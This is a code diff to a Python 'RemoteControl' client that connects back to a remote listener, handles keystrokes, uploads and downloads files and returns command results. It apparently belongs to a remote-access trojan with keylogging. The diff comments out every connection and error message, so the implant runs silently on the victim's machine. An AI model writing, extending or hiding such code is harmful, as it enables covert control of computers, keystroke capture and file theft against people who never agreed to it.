@@ -36,10 +36,10 @@ class RemoteControl:
                 # [*] check 'vk': 65437 bug
                 # key_attributes = dir(key)
                 # for attributes in key_attributes:
-                #    if not callable(getattr(key, attributes)):
-                #        pr = getattr(key, attributes)
-                #        if isinstance(pr, dict):
-                #            print("\n", pr)
+                #     if not callable(getattr(key, attributes)):
+                #         pr = getattr(key, attributes)
+                #         if isinstance(pr, dict):
+                #             print("\n", pr)
 
                 # Check if the key represents the backspace key
                 if key == Key.backspace:
@@ -79,13 +79,13 @@ class RemoteControl:
             try:
                 self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.server_socket.connect((self.l_host, self.l_port))
-                print("[+] Connected!")
+                # print("[+] Connected!")
                 break
             except TimeoutError:
-                print('[!] Connection timed out, retrying in 10 seconds...')
+                # print('[!] Connection timed out, retrying in 10 seconds...')
                 time.sleep(10)
             except Exception as e_connect:
-                print(f'[!] An error occurred: {e_connect}')
+                # print(f'[!] An error occurred: {e_connect}')
                 time.sleep(10)
 
     def send_data_as_json(self, data):
@@ -109,8 +109,8 @@ class RemoteControl:
             with open(file_name, 'rb') as up_file:
                 self.server_socket.send(up_file.read())
         except Exception as e_upload_file:
-            print(f"Error uploading file: {e_upload_file}")
-
+            # print(f"Error uploading file: {e_upload_file}")
+            pass
     def download_file(self, file_name):
         try:
             with open(file_name, 'wb') as down_file:
@@ -123,7 +123,8 @@ class RemoteControl:
         except socket.timeout:
             pass  # Ignore timeouts
         except Exception as e_download_file:
-            print(f"Error downloading file: {e_download_file}")
+            # print(f"Error downloading file: {e_download_file}")
+            pass
         finally:
             self.server_socket.settimeout(None)
 
@@ -225,7 +226,7 @@ class RemoteControl:
                     self.send_data_as_json(result)
 
             except Exception as e_main:
-                print(f"\ndef[Main] Error:\n{e_main}")
+                # print(f"\ndef[Main] Error:\n{e_main}")
                 self.connection_died = 1
                 break
 
@@ -240,7 +241,7 @@ if __name__ == "__main__":
     while True:
         try:
             if server.connection_died == 1:
-                print("\n[!] Connection died. Exiting in 3 seconds...")
+                # print("\n[!] Connection died. Exiting in 3 seconds...")
                 time.sleep(3)
                 exit(0)
 
@@ -255,5 +256,5 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             continue
         except Exception as e_main_loop:
-            print(f"__main__ [Main loop]:\n{e_main_loop}")
+            # print(f"__main__ [Main loop]:\n{e_main_loop}")
             exit(0)
